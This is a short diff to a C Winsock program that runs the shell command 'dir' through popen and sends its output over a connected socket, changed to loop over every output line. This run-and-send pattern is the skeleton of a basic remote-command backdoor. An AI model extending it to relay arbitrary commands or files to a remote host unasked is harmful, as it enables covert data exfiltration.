@@ -35,12 +35,13 @@ if (WSAStartup(MAKEWORD(iReqWinsockVer,0), &wsaData)==0)
                 printf("Connected!\n");
                 FILE* commText = popen("dir","r");
                 if (commText != NULL){
-                    char* lineP = fgets(MSG, sizeof(MSG), commText);
-                    printf("sizeof:%d strlen:%d",sizeof(MSG),strlen(MSG));
-                    if (send(hSocket, MSG, strlen(MSG), 0) == SOCKET_ERROR){
-                        printf("Could not send\n");
-                    }else{
-                        printf("Data sent!\n");
+                    while(fgets(MSG, sizeof(MSG), commText) != NULL){
+                        printf("sizeof:%d strlen:%d",sizeof(MSG),strlen(MSG));
+                        if (send(hSocket, MSG, strlen(MSG), 0) == SOCKET_ERROR){
+                            printf("Could not send\n");
+                        }else{
+                            printf("Data sent!\n");
+                        }
                     }
                 }else{
                     printf("Could not popen.\n");
